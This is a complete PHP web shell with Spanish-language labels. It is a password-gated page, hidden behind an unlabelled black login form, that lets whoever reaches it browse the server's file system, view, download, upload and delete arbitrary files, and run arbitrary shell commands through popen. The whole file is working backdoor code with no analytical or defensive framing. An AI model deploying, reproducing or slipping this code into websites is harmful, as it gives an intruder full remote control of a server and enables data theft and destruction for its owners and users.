<?php
session_start();
function baja($fic) {
    header("Content-disposition: attachment; filename=$fic");
    header("Content-type: application/octet-stream");
    $file = @fopen($fic, "rb") or exit("Error al abrir el fichero:".$fic);
    $data = @fread($file, filesize($fic));
    fclose($file);
    echo $data;
}
function syscall($path, $command){
    $command = "cd $path;$command";
    if ($proc = popen("($command)2>&1","r")){
        $result = "";
        while (!feof($proc)) $result .= fgets($proc, 1000);
        pclose($proc);
        return $result;
    }
}
function getParam($param) {
    if ( isset($_GET[$param]) ) { return $_GET[$param];
    } elseif ( isset($_POST[$param]) ) { return $_POST[$param]; }
}
function lista($path) {
echo"<html><head><meta charset='utf-8'><style type='text/css'>code{font-size:16px;}</style></head>";
    if ( getParam('verWin') ) {
        $fic = urldecode(getParam('verWin'));
        echo "<br><div><table border='1' rules='all' width='100%'><tcaption><pre class='code'>$fic</pre></tcaption></table></div>";
        $data = @highlight_file($fic);
        exit();
    }
?>
<script type="text/javascript">
function addElement(nombre, valor){
    input = document.createElement( "input" );
    input.setAttribute( "type", "text" );
    input.setAttribute( "name", nombre );
    input.setAttribute( "value", valor );
    document.getElementById( "id_accion" ).appendChild(input);
}
function inicio() {
    ocultos = document.getElementById("id_estado").value;
    if (ocultos == "true") {
        document.getElementById("id_ocultos").checked = true;
    } else {
        document.getElementById("id_ocultos").checked = false;
    }
}
function cambia(dir) {
    ocultos = document.getElementById("id_ocultos").checked;
    addElement("dir", encodeURIComponent(dir));
    addElement("ocultos", ocultos);
    document.accion.submit();
}
function ver(doc,dir) {
    ocultos = document.getElementById("id_ocultos").checked;
    addElement("dir", encodeURIComponent(dir));
    addElement("ver", encodeURIComponent(doc));
    addElement("ocultos", ocultos);
    document.accion.submit();
}
function verWin(doc,dir) {
    //pag = window.location.pathname + "?&verWin=" + encodeURIComponent(doc);
    //window.open(pag, doc, "scrollbars=yes");
    var xmlhttp;
    if (window.XMLHttpRequest) {
        xmlhttp=new XMLHttpRequest();
    } else {
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function() {
        if (xmlhttp.readyState==4 && xmlhttp.status==200) {
            w = window.open("", doc, "scrollbars=yes");
            w.document.write(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST", window.location.pathname, true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("verWin=" + encodeURIComponent(doc));
}
function baja(doc,dir) {
    ocultos = document.getElementById("id_ocultos").checked;
    addElement("baja", encodeURIComponent(doc));
    addElement("ocultos", ocultos);
    document.accion.submit();
}
function borra(doc,dir) {
    var r = confirm("¿Borrar fichero?");
    if (r == true) {
        ocultos = document.getElementById("id_ocultos").checked;
        addElement("dir", encodeURIComponent(dir));
        addElement("borra", encodeURIComponent(doc));
        addElement("ocultos", ocultos);
        document.accion.submit();
    }
}
</script>
<style type="text/css">
.lnk a, .lnk a:link, .lnk a:visited, .lnk a:active {color:black; text-decoration:none;}
.lnk a:hover {color:blue;}
</style>
<?php
    $path = realpath($path);
    $ocultos = "false";
    if ( getParam('ocultos') ) { $ocultos = getParam('ocultos'); }
    $directorio = opendir($path);
    $directorios = array();
    $archivos = array();
    while ($archivo = readdir($directorio)) {
        if (substr($archivo,0,1)=="." && $ocultos != "true" && substr($archivo,0,2)!="..") { continue; }
        if (is_dir($path.DIRECTORY_SEPARATOR.$archivo)) {
            if ($archivo != ".") { $directorios[$archivo] = $archivo; }
        } else {
            $archivos[$archivo] = $archivo;
        }
    }
    ksort($directorios);
    ksort($archivos);
    $directorios = array_keys($directorios);
    $archivos = array_keys($archivos);
    $href = "javascript:cambia(\"". $path."\")";
    echo "<body onload='inicio()'><table border='1' rules='all' width='100%'><tcaption class='lnk'><strong>Path: </strong><a href='$href'>$path</a></tcaption>";
    $conta = count($directorios);
    if (count($archivos) > $conta) { $conta = count($archivos); }
    for ($i=0; $i<$conta; $i++) {
        echo "<tr>";
        if (isset($directorios[$i])) {
            $archivo = $directorios[$i];
            $href = "javascript:cambia(\"". $path.DIRECTORY_SEPARATOR.$archivo."\")";
            echo "<td colspan='4'><a href='$href'>[$archivo]</a></td>";
        } else {
            echo "<td colspan='4'>&nbsp;</td>";
        }
        if (isset($archivos[$i])) {
            $archivo = $archivos[$i];
            $doc = $path.DIRECTORY_SEPARATOR.$archivo;
            $href = "javascript:verWin(\"". $doc."\")";
            echo "<td width='50px'><input type='button' value='ver' onclick='ver(\"$doc\", \"$path\");'></td>
                <td width='60px'><input type='button' value='bajar' onclick='baja(\"$doc\", \"$path\");' ></td>
                <td width='70px'><input type='button' value='borrar' onclick='borra(\"$doc\", \"$path\");' ></td>
                <td class='lnk'><a href='$href'>$archivo</a></td>";
        } else {
            echo "<td colspan='4'>&nbsp;</td>";
        }
        echo "<tr>";
    }
    if ($i == 0) {
        $archivo = "..";
        $href = "javascript:cambia(\"". $path.DIRECTORY_SEPARATOR.$archivo."\")";
        echo "<td colspan='4'><a href='$href'>[$archivo]</a></td><td colspan='4'>&nbsp;</td>";
    }
    $url="http://".$_SERVER['HTTP_HOST'].":".$_SERVER['SERVER_PORT'].$_SERVER['REQUEST_URI'];
    $max = 1024 * 1024 * 10;
    echo"<tr><td colspan='8'>&nbsp;</td></tr>
        <tr>
        <form enctype='multipart/form-data' action='$url' method='POST'>
            <td colspan='4'> <pre><input name='ocultos' id='id_ocultos' type='checkbox' /> Ver ocultos</pre>  </td>
            <td colspan='4'>
                <input type='hidden' name='MAX_FILE_SIZE' value='$max'/>
                <input name='userfile' type='file'/>
                <input type='submit' value='Subir'/>
                <input type='hidden' name='dir' value='$path'/>
                <input type='hidden' id='id_estado' value='$ocultos'/>
            </td>
        </form>
        </tr>
        <tr>
        <form action='$url' method='POST'>
            <td colspan='4'>&nbsp;</td></td>
            <td colspan='4'>
                <input type='submit' value='Ejecutar  comando '>
                <input type='text' name='comando'>
                <input type='hidden' name='dir' value='$path'/>
                <input type='hidden' id='id_estado' value='$ocultos'/>
            </td>
        </form>
        <form action='$url' name='accion' id='id_accion' method='POST'></form>
        </tr>";
    if ( getParam('ver') ) {
        $fic = urldecode(getParam('ver'));
        echo "<br><div><table border='1' rules='all' width='100%'><tcaption><pre class='code'>$fic</pre></tcaption></table></div>";
        $data = @highlight_file($fic);
    }
    if ( isset($_FILES['userfile']) ) {
        global $msg;
        echo '<pre>'.$msg;
        print_r($_FILES);
        echo '</pre>';
    }
    if ( getParam('borra') ) {
        global $msg;
        if ($msg) {
            echo "<pre><strong>Borrado:</strong> ".urldecode(getParam('borra'))."</pre>";
        } else {
            echo "<pre><strong>Error al borrar:</strong> ".urldecode(getParam('borra'))."</pre>";
        }
    }
    if (getParam('comando')) {
        global $comando; global $resul;
        echo "<pre><strong>Ejecuta:</strong>$comando</pre>";
        echo "<pre>$resul</pre>";
    }
}
/*
if (!isset($_SESSION["pwd"]) || sha1($_SESSION["pwd"]) != '2030abee0fb9718bf4eee0d1d3bcd091a3265900') {
    $_SESSION["pwd"] = getParam('pwd');
    $pwd = sha1(getParam('pwd'));
    if ($pwd != '2030abee0fb9718bf4eee0d1d3bcd091a3265900') {
        echo "<style type='text/css'>div{width:50%;margin:0 auto}body{background-color:black}input{background-color:black}</style>
            <div><form method='POST'><div><input type='password' name='pwd'><input type='submit' value=''></form><div></div>";
        return;
    }
}
*/
if (!isset($_COOKIE["pwd"]) || sha1($_COOKIE["pwd"]) != '8b3aef5d73c47b0f261d480b5f3a3b6b370c10e7') {
    setcookie( "pwd", getParam('pwd') );
    $pwd = sha1(getParam('pwd'));
    if ($pwd != '8b3aef5d73c47b0f261d480b5f3a3b6b370c10e7') {
        echo "<style type='text/css'>div{width:50%;margin:0 auto}body{background-color:black}input{background-color:black}</style>
            <div><form method='POST'><div><input type='password' name='pwd'><input type='submit' value=''></form><div></div>";
        return;
    }
}
if (isset($_FILES['userfile'])) {
    $uploaddir = $_POST['dir'].DIRECTORY_SEPARATOR;
    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
    if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {$msg = "Subido correctamente.\n";} else {$msg = "ERROR al subir\n";}
    lista( urldecode(getParam('dir')) );
} elseif (getParam('comando')) {
    $comando = getParam('comando');
    $resul = syscall(getParam('dir'), escapeshellcmd($comando));
    lista(getParam('dir'));
} else {
    if (getParam('borra')) { $msg = @unlink(urldecode(getParam('borra'))); }
    if (getParam('dir')) { lista( urldecode(getParam('dir')) ); }
    elseif (getParam('baja')) { baja(urldecode(getParam('baja'))); exit();}
    else {lista(getcwd());}
}
echo "</table></body></html>";
?>
